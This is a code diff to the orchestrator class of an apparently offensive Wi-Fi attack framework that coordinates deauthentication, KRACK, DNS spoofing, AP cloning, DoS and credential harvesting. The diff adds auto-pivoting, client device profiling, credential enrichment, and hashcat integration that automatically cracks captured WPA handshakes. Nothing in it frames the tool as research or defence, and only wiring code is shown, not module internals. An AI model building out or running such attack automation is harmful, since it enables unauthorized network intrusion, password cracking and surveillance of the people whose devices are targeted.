@@ -46,6 +46,10 @@ from .client_isolation import ClientIsolationEngine
 from .printer_recon import PrinterRecon
 from .print_interceptor import PrintJobInterceptor
 from .printer_creds import PrinterCredentialHarvester as PrinterCredHarvester
+from .auto_pivot import AutoPivot
+from .client_profiler import ClientProfiler
+from .cred_enrichment import CredentialEnrichment
+from .hashcat_integration import HashcatIntegration
 
 
 class AttackOrchestrator:
@@ -76,6 +80,10 @@ class AttackOrchestrator:
                  enable_dos=False, dos_mode=None,
                  enable_client_isolation=False,
                  enable_printer_attacks=False,
+                 enable_auto_pivot=False,
+                 enable_client_profiling=False,
+                 enable_cred_enrichment=False,
+                 enable_hashcat=False, hashcat_wordlist=None,
                  plugins=None, plugins_dir=None):
         self.monitor_iface = monitor_iface
         self.ap_iface = ap_iface
@@ -97,6 +105,13 @@ class AttackOrchestrator:
         self.dos_mode = dos_mode or "cts_flood"
         self.enable_client_isolation = enable_client_isolation
         self.enable_printer_attacks = enable_printer_attacks
+
+        # Credential intelligence flags
+        self.enable_auto_pivot = enable_auto_pivot
+        self.enable_client_profiling = enable_client_profiling
+        self.enable_cred_enrichment = enable_cred_enrichment
+        self.enable_hashcat = enable_hashcat
+        self.hashcat_wordlist = hashcat_wordlist
 
         self.db = db or POSDatabase()
         self.recon = ReconEngine(monitor_iface, self.db, channels=self.channels)
@@ -126,6 +141,12 @@ class AttackOrchestrator:
         self.printer_recon = None
         self.print_interceptor = None
         self.printer_cred_harvester = None
+
+        # Credential intelligence modules
+        self.auto_pivot = None
+        self.client_profiler = None
+        self.cred_enrichment = None
+        self.hashcat = None
 
         # Plugin system
         self._plugin_loader = None
@@ -326,6 +347,23 @@ class AttackOrchestrator:
             threading.Thread(target=self.printer_cred_harvester.start, daemon=True).start()
             log.info("Printer credential harvester enabled")
 
+        # ── Phase 5f: Credential Intelligence ────────────────────────────────
+        if self.enable_cred_enrichment:
+            self.cred_enrichment = CredentialEnrichment(db=self.db)
+            log.info("Credential enrichment enabled")
+
+        if self.enable_client_profiling:
+            self.client_profiler = ClientProfiler(db=self.db)
+            log.info("Client profiling enabled")
+
+        if self.enable_auto_pivot:
+            self.auto_pivot = AutoPivot(self.monitor_iface)
+            log.info("Auto-pivot enabled (will activate after successful cred test)")
+
+        if self.enable_hashcat:
+            self.hashcat = HashcatIntegration()
+            log.info("Hashcat integration enabled")
+
         # ── Phase 6: Background Recon (feeds new clients into deauth) ────────
         self.recon.running = True
         threading.Thread(target=self._background_recon, daemon=True).start()
@@ -366,12 +404,20 @@ class AttackOrchestrator:
                             pcap_file = self.handshakes.export_pcap(client_mac, bssid)
                             if pcap_file and self.test_credentials:
                                 log.info(f"Handshake saved to {pcap_file} - ready for hashcat")
+                            # Auto-feed to hashcat if enabled
+                            if pcap_file and self.hashcat and self.hashcat_wordlist:
+                                self.hashcat.start_crack(pcap_file, self.hashcat_wordlist)
+                                log.info(f"Auto-feeding handshake to hashcat: {pcap_file}")
                             # Trigger KRACK if enabled
                             if self.enable_krack and not self.krack_engine:
                                 self.krack_engine = KRACKEngine(
                                     self.monitor_iface, client_mac, bssid)
                                 self.krack_engine.start()
                                 log.info(f"KRACK engine launched against {client_mac}")
+
+            # Client profiling from packets
+            if self.client_profiler:
+                self.client_profiler.update_from_packet(pkt)
 
             # Dynamically add newly seen clients of the target AP
             if pkt.haslayer(Dot11) and pkt.type == 2:
@@ -417,7 +463,8 @@ class AttackOrchestrator:
             self.dns_spoof, self.cred_harvester, self.network_disruption,
             self.ap_clone, self.krack_engine, self.dos_engine,
             self.client_isolation, self.printer_recon,
-            self.print_interceptor, self.printer_cred_harvester
+            self.print_interceptor, self.printer_cred_harvester,
+            self.auto_pivot, self.hashcat
         ]
         
         for engine in engines:
@@ -429,6 +476,9 @@ class AttackOrchestrator:
         
         # Now safe to close database
         if self.db:
+            # Save client profiles before closing
+            if self.client_profiler:
+                self.client_profiler.save_to_db()
             self.db.close()
         
         # Export any remaining handshakes
